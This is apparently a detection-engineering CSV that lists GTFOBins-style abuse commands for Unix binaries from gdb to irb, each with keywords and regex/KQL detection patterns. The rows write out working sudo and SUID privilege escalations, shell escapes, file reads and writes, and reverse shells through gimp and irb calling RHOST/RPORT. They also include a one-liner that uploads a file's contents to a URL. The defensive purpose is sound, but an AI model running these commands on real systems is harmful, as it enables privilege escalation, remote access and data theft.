Name,Function,ExampleCode,KeywordsExtracted,RegexFuzzyV7,RegexFuzzyV7_KQL,Notes
gdb,library-load,"gdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary(""lib.so"")' -ex quit",python from ctypes import cdll cdll.LoadLibrary lib.so quit,(?i)\b(?:\S*/)?gdb.*python.*from.*ctypes.*import.*cdll.*cdll\.LoadLibrary.*lib\.so.*quit,"@""(?i)\b(?:\S*/)?gdb.*python.*from.*ctypes.*import.*cdll.*cdll\.LoadLibrary.*lib\.so.*quit""",
gdb,suid,"./gdb -nx -ex 'python import os; os.execl(""/bin/sh"", ""sh"", ""-p"")' -ex quit",python import os.execl /bin/sh sh quit /gdb,(?i)\b(?:\S*/)?gdb.*python.*import.*os\.execl.*/bin/sh.*sh.*quit.*/gdb,"@""(?i)\b(?:\S*/)?gdb.*python.*import.*os\.execl.*/bin/sh.*sh.*quit.*/gdb""",
gdb,sudo,sudo gdb -nx -ex '!sh' -ex quit,sudo sh quit,(?i)\b(?:\S*/)?gdb.*sudo.*sh.*quit,"@""(?i)\b(?:\S*/)?gdb.*sudo.*sh.*quit""",
gdb,capabilities,./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit,python import os.setuid sh quit /gdb,(?i)\b(?:\S*/)?gdb.*python.*import.*os\.setuid.*sh.*quit.*/gdb,"@""(?i)\b(?:\S*/)?gdb.*python.*import.*os\.setuid.*sh.*quit.*/gdb""",
gem,shell,"gem open -e ""/bin/sh -c /bin/sh"" rdoc",open /bin/sh rdoc,(?i)\b(?:\S*/)?gem.*open.*/bin/sh.*rdoc,"@""(?i)\b(?:\S*/)?gem.*open.*/bin/sh.*rdoc""",
gem,shell,"gem open rdoc
:!/bin/sh",open rdoc /bin/sh,(?i)\b(?:\S*/)?gem.*open.*rdoc.*/bin/sh,"@""(?i)\b(?:\S*/)?gem.*open.*rdoc.*/bin/sh""",
gem,shell,"echo 'system(""/bin/sh"")' > $TF/x
gem build $TF/x",echo system /bin/sh build,(?i)\b(?:\S*/)?gem.*echo.*system.*/bin/sh.*build,"@""(?i)\b(?:\S*/)?gem.*echo.*system.*/bin/sh.*build""",
gem,shell,"echo 'system(""/bin/sh"")' > $TF/x
gem install --file $TF/x",echo system /bin/sh install --file,(?i)\b(?:\S*/)?gem.*echo.*system.*/bin/sh.*install.*\-\-file,"@""(?i)\b(?:\S*/)?gem.*echo.*system.*/bin/sh.*install.*\-\-file""",
gem,sudo,"sudo gem open -e ""/bin/sh -c /bin/sh"" rdoc",sudo open /bin/sh rdoc,(?i)\b(?:\S*/)?gem.*sudo.*open.*/bin/sh.*rdoc,"@""(?i)\b(?:\S*/)?gem.*sudo.*open.*/bin/sh.*rdoc""",
genie,shell,genie -c '/bin/sh',/bin/sh,(?i)\b(?:\S*/)?genie.*/bin/sh,"@""(?i)\b(?:\S*/)?genie.*/bin/sh""",
genie,suid,./genie -c '/bin/sh',/bin/sh /genie,(?i)\b(?:\S*/)?genie.*/bin/sh.*/genie,"@""(?i)\b(?:\S*/)?genie.*/bin/sh.*/genie""",
genie,sudo,sudo genie -c '/bin/sh',sudo /bin/sh,(?i)\b(?:\S*/)?genie.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?genie.*sudo.*/bin/sh""",
genisoimage,file-read,"genisoimage -q -o - ""$LFILE""",,(?i)\b(?:\S*/)?genisoimage\b,"@""(?i)\b(?:\S*/)?genisoimage\b""",
genisoimage,suid,"./genisoimage -sort ""$LFILE""","""-sort /genisoimage",(?i)\b(?:\S*/)?genisoimage.*\-sort.*/genisoimage,"@""(?i)\b(?:\S*/)?genisoimage.*\-sort.*/genisoimage""",
genisoimage,sudo,"sudo genisoimage -q -o - ""$LFILE""",sudo,(?i)\b(?:\S*/)?genisoimage.*sudo,"@""(?i)\b(?:\S*/)?genisoimage.*sudo""",
ghc,shell,"ghc -e 'System.Process.callCommand ""/bin/sh""'",System.Process.callCommand /bin/sh,(?i)\b(?:\S*/)?ghc.*System\.Process\.callCommand.*/bin/sh,"@""(?i)\b(?:\S*/)?ghc.*System\.Process\.callCommand.*/bin/sh""",
ghc,sudo,"sudo ghc -e 'System.Process.callCommand ""/bin/sh""'",sudo System.Process.callCommand /bin/sh,(?i)\b(?:\S*/)?ghc.*sudo.*System\.Process\.callCommand.*/bin/sh,"@""(?i)\b(?:\S*/)?ghc.*sudo.*System\.Process\.callCommand.*/bin/sh""",
ghci,shell,"ghci
System.Process.callCommand ""/bin/sh""",System.Process.callCommand /bin/sh,(?i)\b(?:\S*/)?ghci.*System\.Process\.callCommand.*/bin/sh,"@""(?i)\b(?:\S*/)?ghci.*System\.Process\.callCommand.*/bin/sh""",
ghci,sudo,"sudo ghci
System.Process.callCommand ""/bin/sh""",sudo System.Process.callCommand /bin/sh,(?i)\b(?:\S*/)?ghci.*sudo.*System\.Process\.callCommand.*/bin/sh,"@""(?i)\b(?:\S*/)?ghci.*sudo.*System\.Process\.callCommand.*/bin/sh""",
gimp,shell,"gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(""sh"")'","""-idf --batch-interpreter=python-fu-eval import os.system sh",(?i)\b(?:\S*/)?gimp.*\-idf.*\-\-batch\-interpreterpython\-fu\-eval.*import.*os\.system.*sh,"@""(?i)\b(?:\S*/)?gimp.*\-idf.*\-\-batch\-interpreterpython\-fu\-eval.*import.*os\.system.*sh""",
gimp,reverse-shell,"gimp -idf --batch-interpreter=python-fu-eval -b 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")'","""-idf --batch-interpreter=python-fu-eval import sys pty s=socket.socket s.connect os.getenv int os.dup2 s.fileno for pty.spawn /bin/sh",(?i)\b(?:\S*/)?gimp.*\-idf.*\-\-batch\-interpreterpython\-fu\-eval.*import.*sys.*pty.*ssocket\.socket.*s\.connect.*os\.getenv,"@""(?i)\b(?:\S*/)?gimp.*\-idf.*\-\-batch\-interpreterpython\-fu\-eval.*import.*sys.*pty.*ssocket\.socket.*s\.connect.*os\.getenv""",
gimp,file-upload,"gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))'",-idf --batch-interpreter=python-fu-eval import sys from environ sys.version_info.major urllib.request urllib.parse else urllib urllib2 r.urlopen bytes u.urlencode open .read .encode,(?i)\b(?:\S*/)?gimp.*\-idf.*\-\-batch\-interpreterpython\-fu\-eval.*import.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request,"@""(?i)\b(?:\S*/)?gimp.*\-idf.*\-\-batch\-interpreterpython\-fu\-eval.*import.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request""",
gimp,file-upload,"gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()'",-idf --batch-interpreter=python-fu-eval import sys from environ sys.version_info.major http.server socketserver else SimpleHTTPServer ss.TCPServer int s.SimpleHTTPRequestHandler .serve_forever,(?i)\b(?:\S*/)?gimp.*\-idf.*\-\-batch\-interpreterpython\-fu\-eval.*import.*sys.*from.*environ.*sys\.version_info\.major.*http\.server,"@""(?i)\b(?:\S*/)?gimp.*\-idf.*\-\-batch\-interpreterpython\-fu\-eval.*import.*sys.*from.*environ.*sys\.version_info\.major.*http\.server""",
gimp,file-download,"gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])'","""-idf --batch-interpreter=python-fu-eval import sys from environ sys.version_info.major urllib.request else urllib r.urlretrieve",(?i)\b(?:\S*/)?gimp.*\-idf.*\-\-batch\-interpreterpython\-fu\-eval.*import.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request,"@""(?i)\b(?:\S*/)?gimp.*\-idf.*\-\-batch\-interpreterpython\-fu\-eval.*import.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request""",
gimp,file-write,"gimp -idf --batch-interpreter=python-fu-eval -b 'open(""file_to_write"", ""wb"").write(""DATA"")'",-idf --batch-interpreter=python-fu-eval open .write,(?i)\b(?:\S*/)?gimp.*\-idf.*\-\-batch\-interpreterpython\-fu\-eval.*open.*\.write,"@""(?i)\b(?:\S*/)?gimp.*\-idf.*\-\-batch\-interpreterpython\-fu\-eval.*open.*\.write""",
gimp,file-read,"gimp -idf --batch-interpreter=python-fu-eval -b 'print(open(""file_to_read"").read())'",-idf --batch-interpreter=python-fu-eval print open .read,(?i)\b(?:\S*/)?gimp.*\-idf.*\-\-batch\-interpreterpython\-fu\-eval.*print.*open.*\.read,"@""(?i)\b(?:\S*/)?gimp.*\-idf.*\-\-batch\-interpreterpython\-fu\-eval.*print.*open.*\.read""",
gimp,library-load,"gimp -idf --batch-interpreter=python-fu-eval -b 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")'","""-idf --batch-interpreter=python-fu-eval from ctypes import cdll cdll.LoadLibrary lib.so",(?i)\b(?:\S*/)?gimp.*\-idf.*\-\-batch\-interpreterpython\-fu\-eval.*from.*ctypes.*import.*cdll.*cdll\.LoadLibrary.*lib\.so,"@""(?i)\b(?:\S*/)?gimp.*\-idf.*\-\-batch\-interpreterpython\-fu\-eval.*from.*ctypes.*import.*cdll.*cdll\.LoadLibrary.*lib\.so""",
gimp,suid,"./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(""/bin/sh"", ""sh"", ""-p"")'","""-idf --batch-interpreter=python-fu-eval import os.execl /bin/sh sh /gimp",(?i)\b(?:\S*/)?gimp.*\-idf.*\-\-batch\-interpreterpython\-fu\-eval.*import.*os\.execl.*/bin/sh.*sh.*/gimp,"@""(?i)\b(?:\S*/)?gimp.*\-idf.*\-\-batch\-interpreterpython\-fu\-eval.*import.*os\.execl.*/bin/sh.*sh.*/gimp""",
gimp,sudo,"sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(""sh"")'",sudo -idf --batch-interpreter=python-fu-eval import os.system sh,(?i)\b(?:\S*/)?gimp.*sudo.*\-idf.*\-\-batch\-interpreterpython\-fu\-eval.*import.*os\.system.*sh,"@""(?i)\b(?:\S*/)?gimp.*sudo.*\-idf.*\-\-batch\-interpreterpython\-fu\-eval.*import.*os\.system.*sh""",
ginsh,shell,"ginsh
!/bin/sh",/bin/sh,(?i)\b(?:\S*/)?ginsh.*/bin/sh,"@""(?i)\b(?:\S*/)?ginsh.*/bin/sh""",
ginsh,limited-suid,"./ginsh
!/bin/sh",/bin/sh /ginsh,(?i)\b(?:\S*/)?ginsh.*/bin/sh.*/ginsh,"@""(?i)\b(?:\S*/)?ginsh.*/bin/sh.*/ginsh""",
ginsh,sudo,"sudo ginsh
!/bin/sh",sudo /bin/sh,(?i)\b(?:\S*/)?ginsh.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?ginsh.*sudo.*/bin/sh""",
git,shell,"PAGER='sh -c ""exec sh 0<&1""' git -p help",PAGER= sh exec help,(?i)\b(?:\S*/)?git.*PAGER.*sh.*exec.*help,"@""(?i)\b(?:\S*/)?git.*PAGER.*sh.*exec.*help""",
git,shell,"git help config
!/bin/sh",help config /bin/sh,(?i)\b(?:\S*/)?git.*help.*config.*/bin/sh,"@""(?i)\b(?:\S*/)?git.*help.*config.*/bin/sh""",
git,shell,"git branch --help config
!/bin/sh",branch --help config /bin/sh,(?i)\b(?:\S*/)?git.*branch.*\-\-help.*config.*/bin/sh,"@""(?i)\b(?:\S*/)?git.*branch.*\-\-help.*config.*/bin/sh""",
git,shell,"git init ""$TF""
echo 'exec /bin/sh 0<&2 1>&2' >""$TF/.git/hooks/pre-commit.sample""
mv ""$TF/.git/hooks/pre-commit.sample"" ""$TF/.git/hooks/pre-commit""
git -C ""$TF"" commit --allow-empty -m x",init echo exec /bin/sh TF/.git/hooks/pre-commit.sample TF/.git/hooks/pre-commit commit --allow-empty /.git/hooks/pre-commit.sample /.git/hooks/pre-commit,(?i)\b(?:\S*/)?git.*init.*echo.*exec.*/bin/sh.*TF/\.git/hooks/pre\-commit\.sample.*TF/\.git/hooks/pre\-commit.*commit.*\-\-allow\-empty,"@""(?i)\b(?:\S*/)?git.*init.*echo.*exec.*/bin/sh.*TF/\.git/hooks/pre\-commit\.sample.*TF/\.git/hooks/pre\-commit.*commit.*\-\-allow\-empty""",
git,shell,"ln -s /bin/sh ""$TF/git-x""
git ""--exec-path=$TF"" x",/bin/sh TF/git-x --exec-path= /git-x,(?i)\b(?:\S*/)?git.*/bin/sh.*TF/git\-x.*\-\-exec\-path.*/git\-x,"@""(?i)\b(?:\S*/)?git.*/bin/sh.*TF/git\-x.*\-\-exec\-path.*/git\-x""",
git,file-read,git diff /dev/null $LFILE,diff /dev/null,(?i)\b(?:\S*/)?git.*diff.*/dev/null,"@""(?i)\b(?:\S*/)?git.*diff.*/dev/null""",
git,file-write,git apply --unsafe-paths --directory / x.patch,apply --unsafe-paths --directory x.patch,(?i)\b(?:\S*/)?git.*apply.*\-\-unsafe\-paths.*\-\-directory.*x\.patch,"@""(?i)\b(?:\S*/)?git.*apply.*\-\-unsafe\-paths.*\-\-directory.*x\.patch""",
git,sudo,"sudo PAGER='sh -c ""exec sh 0<&1""' git -p help",sudo PAGER= sh exec help,(?i)\b(?:\S*/)?git.*sudo.*PAGER.*sh.*exec.*help,"@""(?i)\b(?:\S*/)?git.*sudo.*PAGER.*sh.*exec.*help""",
git,sudo,"sudo git -p help config
!/bin/sh",sudo help config /bin/sh,(?i)\b(?:\S*/)?git.*sudo.*help.*config.*/bin/sh,"@""(?i)\b(?:\S*/)?git.*sudo.*help.*config.*/bin/sh""",
git,sudo,"sudo git branch --help config
!/bin/sh",sudo branch --help config /bin/sh,(?i)\b(?:\S*/)?git.*sudo.*branch.*\-\-help.*config.*/bin/sh,"@""(?i)\b(?:\S*/)?git.*sudo.*branch.*\-\-help.*config.*/bin/sh""",
git,sudo,"git init ""$TF""
echo 'exec /bin/sh 0<&2 1>&2' >""$TF/.git/hooks/pre-commit.sample""
mv ""$TF/.git/hooks/pre-commit.sample"" ""$TF/.git/hooks/pre-commit""
sudo git -C ""$TF"" commit --allow-empty -m x",init echo exec /bin/sh TF/.git/hooks/pre-commit.sample TF/.git/hooks/pre-commit sudo commit --allow-empty /.git/hooks/pre-commit.sample /.git/hooks/pre-commit,(?i)\b(?:\S*/)?git.*init.*echo.*exec.*/bin/sh.*TF/\.git/hooks/pre\-commit\.sample.*TF/\.git/hooks/pre\-commit.*sudo.*commit,"@""(?i)\b(?:\S*/)?git.*init.*echo.*exec.*/bin/sh.*TF/\.git/hooks/pre\-commit\.sample.*TF/\.git/hooks/pre\-commit.*sudo.*commit""",
git,sudo,"ln -s /bin/sh ""$TF/git-x""
sudo git ""--exec-path=$TF"" x",/bin/sh TF/git-x sudo --exec-path= /git-x,(?i)\b(?:\S*/)?git.*/bin/sh.*TF/git\-x.*sudo.*\-\-exec\-path.*/git\-x,"@""(?i)\b(?:\S*/)?git.*/bin/sh.*TF/git\-x.*sudo.*\-\-exec\-path.*/git\-x""",
git,limited-suid,"PAGER='sh -c ""exec sh 0<&1""' ./git -p help",PAGER= sh exec help /git,(?i)\b(?:\S*/)?git.*PAGER.*sh.*exec.*help.*/git,"@""(?i)\b(?:\S*/)?git.*PAGER.*sh.*exec.*help.*/git""",
grc,shell,grc --pty /bin/sh,"""--pty /bin/sh",(?i)\b(?:\S*/)?grc.*\-\-pty.*/bin/sh,"@""(?i)\b(?:\S*/)?grc.*\-\-pty.*/bin/sh""",
grc,sudo,sudo grc --pty /bin/sh,sudo --pty /bin/sh,(?i)\b(?:\S*/)?grc.*sudo.*\-\-pty.*/bin/sh,"@""(?i)\b(?:\S*/)?grc.*sudo.*\-\-pty.*/bin/sh""",
grep,file-read,grep '' $LFILE,,(?i)\b(?:\S*/)?grep\b,"@""(?i)\b(?:\S*/)?grep\b""",
grep,suid,./grep '' $LFILE,/grep,(?i)\b(?:\S*/)?grep.*/grep,"@""(?i)\b(?:\S*/)?grep.*/grep""",
grep,sudo,sudo grep '' $LFILE,sudo,(?i)\b(?:\S*/)?grep.*sudo,"@""(?i)\b(?:\S*/)?grep.*sudo""",
gtester,file-write,"gtester ""DATA"" -o $LFILE",,(?i)\b(?:\S*/)?gtester\b,"@""(?i)\b(?:\S*/)?gtester\b""",
gtester,shell,"echo '#!/bin/sh' > $TF
echo 'exec /bin/sh -p 0<&1' >> $TF
chmod +x $TF
gtester -q $TF",echo /bin/sh exec chmod,(?i)\b(?:\S*/)?gtester.*echo.*/bin/sh.*exec.*chmod,"@""(?i)\b(?:\S*/)?gtester.*echo.*/bin/sh.*exec.*chmod""",
gtester,sudo,"echo '#!/bin/sh' > $TF
echo 'exec /bin/sh 0<&1' >> $TF
chmod +x $TF
sudo gtester -q $TF",echo /bin/sh exec chmod sudo,(?i)\b(?:\S*/)?gtester.*echo.*/bin/sh.*exec.*chmod.*sudo,"@""(?i)\b(?:\S*/)?gtester.*echo.*/bin/sh.*exec.*chmod.*sudo""",
gtester,suid,"echo '#!/bin/sh -p' > $TF
echo 'exec /bin/sh -p 0<&1' >> $TF
chmod +x $TF
sudo gtester -q $TF",echo /bin/sh exec chmod sudo,(?i)\b(?:\S*/)?gtester.*echo.*/bin/sh.*exec.*chmod.*sudo,"@""(?i)\b(?:\S*/)?gtester.*echo.*/bin/sh.*exec.*chmod.*sudo""",
gzip,file-read,gzip -f $LFILE -t,,(?i)\b(?:\S*/)?gzip\b,"@""(?i)\b(?:\S*/)?gzip\b""",
gzip,file-read,gzip -c $LFILE | gzip -d,,(?i)\b(?:\S*/)?gzip\b,"@""(?i)\b(?:\S*/)?gzip\b""",
gzip,suid,./gzip -f $LFILE -t,/gzip,(?i)\b(?:\S*/)?gzip.*/gzip,"@""(?i)\b(?:\S*/)?gzip.*/gzip""",
gzip,sudo,sudo gzip -f $LFILE -t,sudo,(?i)\b(?:\S*/)?gzip.*sudo,"@""(?i)\b(?:\S*/)?gzip.*sudo""",
hd,file-read,"hd ""$LFILE""",,(?i)\b(?:\S*/)?hd\b,"@""(?i)\b(?:\S*/)?hd\b""",
hd,suid,"./hd ""$LFILE""",,(?i)\b(?:\S*/)?hd\b,"@""(?i)\b(?:\S*/)?hd\b""",
hd,sudo,"sudo hd ""$LFILE""",sudo,(?i)\b(?:\S*/)?hd.*sudo,"@""(?i)\b(?:\S*/)?hd.*sudo""",
head,file-read,"head -c1G ""$LFILE""",,(?i)\b(?:\S*/)?head\b,"@""(?i)\b(?:\S*/)?head\b""",
head,suid,"./head -c1G ""$LFILE""",/head,(?i)\b(?:\S*/)?head.*/head,"@""(?i)\b(?:\S*/)?head.*/head""",
head,sudo,"sudo head -c1G ""$LFILE""",sudo,(?i)\b(?:\S*/)?head.*sudo,"@""(?i)\b(?:\S*/)?head.*sudo""",
hexdump,file-read,"hexdump -C ""$LFILE""",,(?i)\b(?:\S*/)?hexdump\b,"@""(?i)\b(?:\S*/)?hexdump\b""",
hexdump,suid,"./hexdump -C ""$LFILE""",/hexdump,(?i)\b(?:\S*/)?hexdump.*/hexdump,"@""(?i)\b(?:\S*/)?hexdump.*/hexdump""",
hexdump,sudo,"sudo hexdump -C ""$LFILE""",sudo,(?i)\b(?:\S*/)?hexdump.*sudo,"@""(?i)\b(?:\S*/)?hexdump.*sudo""",
highlight,file-read,"highlight --no-doc --failsafe ""$LFILE""","""--no-doc --failsafe",(?i)\b(?:\S*/)?highlight.*\-\-no\-doc.*\-\-failsafe,"@""(?i)\b(?:\S*/)?highlight.*\-\-no\-doc.*\-\-failsafe""",
highlight,suid,"./highlight --no-doc --failsafe ""$LFILE""","""--no-doc --failsafe /highlight",(?i)\b(?:\S*/)?highlight.*\-\-no\-doc.*\-\-failsafe.*/highlight,"@""(?i)\b(?:\S*/)?highlight.*\-\-no\-doc.*\-\-failsafe.*/highlight""",
highlight,sudo,"sudo highlight --no-doc --failsafe ""$LFILE""",sudo --no-doc --failsafe,(?i)\b(?:\S*/)?highlight.*sudo.*\-\-no\-doc.*\-\-failsafe,"@""(?i)\b(?:\S*/)?highlight.*sudo.*\-\-no\-doc.*\-\-failsafe""",
hping3,shell,"hping3
/bin/sh",/bin/sh,(?i)\b(?:\S*/)?hping3.*/bin/sh,"@""(?i)\b(?:\S*/)?hping3.*/bin/sh""",
hping3,suid,"./hping3
/bin/sh -p",/bin/sh /hping3,(?i)\b(?:\S*/)?hping3.*/bin/sh.*/hping3,"@""(?i)\b(?:\S*/)?hping3.*/bin/sh.*/hping3""",
hping3,sudo,"sudo hping3
/bin/sh",sudo /bin/sh,(?i)\b(?:\S*/)?hping3.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?hping3.*sudo.*/bin/sh""",
hping3,sudo,"sudo hping3 ""$RHOST"" --icmp --data 500 --sign xxx --file ""$LFILE""",sudo --icmp --data --sign xxx --file,(?i)\b(?:\S*/)?hping3.*sudo.*\-\-icmp.*\-\-data.*\-\-sign.*xxx.*\-\-file,"@""(?i)\b(?:\S*/)?hping3.*sudo.*\-\-icmp.*\-\-data.*\-\-sign.*xxx.*\-\-file""",
iconv,file-write,"echo ""DATA"" | iconv -f 8859_1 -t 8859_1 -o ""$LFILE""",echo,(?i)\b(?:\S*/)?iconv.*echo,"@""(?i)\b(?:\S*/)?iconv.*echo""",
iconv,file-read,"iconv -f 8859_1 -t 8859_1 ""$LFILE""",,(?i)\b(?:\S*/)?iconv\b,"@""(?i)\b(?:\S*/)?iconv\b""",
iconv,suid,"./iconv -f 8859_1 -t 8859_1 ""$LFILE""",/iconv,(?i)\b(?:\S*/)?iconv.*/iconv,"@""(?i)\b(?:\S*/)?iconv.*/iconv""",
iconv,sudo,"./iconv -f 8859_1 -t 8859_1 ""$LFILE""",/iconv,(?i)\b(?:\S*/)?iconv.*/iconv,"@""(?i)\b(?:\S*/)?iconv.*/iconv""",
iftop,shell,"iftop
!/bin/sh",/bin/sh,(?i)\b(?:\S*/)?iftop.*/bin/sh,"@""(?i)\b(?:\S*/)?iftop.*/bin/sh""",
iftop,limited-suid,"./iftop
!/bin/sh",/bin/sh /iftop,(?i)\b(?:\S*/)?iftop.*/bin/sh.*/iftop,"@""(?i)\b(?:\S*/)?iftop.*/bin/sh.*/iftop""",
iftop,sudo,"sudo iftop
!/bin/sh",sudo /bin/sh,(?i)\b(?:\S*/)?iftop.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?iftop.*sudo.*/bin/sh""",
install,suid,./install -m 6777 $LFILE $TF,/install,(?i)\b(?:\S*/)?install.*/install,"@""(?i)\b(?:\S*/)?install.*/install""",
install,sudo,sudo install -m 6777 $LFILE $TF,sudo,(?i)\b(?:\S*/)?install.*sudo,"@""(?i)\b(?:\S*/)?install.*sudo""",
ionice,shell,ionice /bin/sh,/bin/sh,(?i)\b(?:\S*/)?ionice.*/bin/sh,"@""(?i)\b(?:\S*/)?ionice.*/bin/sh""",
ionice,suid,./ionice /bin/sh -p,/bin/sh /ionice,(?i)\b(?:\S*/)?ionice.*/bin/sh.*/ionice,"@""(?i)\b(?:\S*/)?ionice.*/bin/sh.*/ionice""",
ionice,sudo,sudo ionice /bin/sh,sudo /bin/sh,(?i)\b(?:\S*/)?ionice.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?ionice.*sudo.*/bin/sh""",
ip,file-read,"ip -force -batch ""$LFILE""","""-force -batch",(?i)\b(?:\S*/)?ip.*\-force.*\-batch,"@""(?i)\b(?:\S*/)?ip.*\-force.*\-batch""",
ip,suid,"./ip -force -batch ""$LFILE""","""-force -batch",(?i)\b(?:\S*/)?ip.*\-force.*\-batch,"@""(?i)\b(?:\S*/)?ip.*\-force.*\-batch""",
ip,suid,"./ip netns add foo
./ip netns exec foo /bin/sh -p
./ip netns delete foo",netns add foo exec /bin/sh delete,(?i)\b(?:\S*/)?ip.*netns.*add.*foo.*exec.*/bin/sh.*delete,"@""(?i)\b(?:\S*/)?ip.*netns.*add.*foo.*exec.*/bin/sh.*delete""",
ip,sudo,"sudo ip -force -batch ""$LFILE""",sudo -force -batch,(?i)\b(?:\S*/)?ip.*sudo.*\-force.*\-batch,"@""(?i)\b(?:\S*/)?ip.*sudo.*\-force.*\-batch""",
ip,sudo,"sudo ip netns add foo
sudo ip netns exec foo /bin/sh
sudo ip netns delete foo",sudo netns add foo exec /bin/sh delete,(?i)\b(?:\S*/)?ip.*sudo.*netns.*add.*foo.*exec.*/bin/sh.*delete,"@""(?i)\b(?:\S*/)?ip.*sudo.*netns.*add.*foo.*exec.*/bin/sh.*delete""",
ip,sudo,"sudo ip netns add foo
sudo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar
sudo ip netns exec bar /bin/sh
sudo ip netns delete foo
sudo ip netns delete bar",sudo netns add foo exec /bin/ln /proc/1/ns/net /var/run/netns/bar bar /bin/sh delete,(?i)\b(?:\S*/)?ip.*sudo.*netns.*add.*foo.*exec.*/bin/ln.*/proc/1/ns/net.*/var/run/netns/bar,"@""(?i)\b(?:\S*/)?ip.*sudo.*netns.*add.*foo.*exec.*/bin/ln.*/proc/1/ns/net.*/var/run/netns/bar""",
irb,shell,"irb
exec '/bin/bash'",exec /bin/bash,(?i)\b(?:\S*/)?irb.*exec.*/bin/bash,"@""(?i)\b(?:\S*/)?irb.*exec.*/bin/bash""",
irb,reverse-shell,"irb
require 'socket'; exit if fork;c=TCPSocket.new(ENV[""RHOST""],ENV[""RPORT""]);while(cmd=c.gets);IO.popen(cmd,""r""){|io|c.print io.read} end",require exit fork c=TCPSocket.new ENV while cmd=c.gets IO.popen c.print io.read end,(?i)\b(?:\S*/)?irb.*require.*exit.*fork.*cTCPSocket\.new.*ENV.*while.*cmdc\.gets.*IO\.popen,"@""(?i)\b(?:\S*/)?irb.*require.*exit.*fork.*cTCPSocket\.new.*ENV.*while.*cmdc\.gets.*IO\.popen""",
irb,file-upload,"irb
require 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;",require webrick HTTPServer.new DocumentRoot Dir.pwd .start,(?i)\b(?:\S*/)?irb.*require.*webrick.*HTTPServer\.new.*DocumentRoot.*Dir\.pwd.*\.start,"@""(?i)\b(?:\S*/)?irb.*require.*webrick.*HTTPServer\.new.*DocumentRoot.*Dir\.pwd.*\.start""",
irb,file-download,"irb
require 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])",require open-uri download open ENV IO.copy_stream,(?i)\b(?:\S*/)?irb.*require.*open\-uri.*download.*open.*ENV.*IO\.copy_stream,"@""(?i)\b(?:\S*/)?irb.*require.*open\-uri.*download.*open.*ENV.*IO\.copy_stream""",
irb,file-write,"irb
File.open(""file_to_write"", ""w+"") { |f| f.write(""DATA"") }",File.open f.write,(?i)\b(?:\S*/)?irb.*File\.open.*f\.write,"@""(?i)\b(?:\S*/)?irb.*File\.open.*f\.write""",
irb,file-read,"irb
puts File.read(""file_to_read"")",puts File.read,(?i)\b(?:\S*/)?irb.*puts.*File\.read,"@""(?i)\b(?:\S*/)?irb.*puts.*File\.read""",
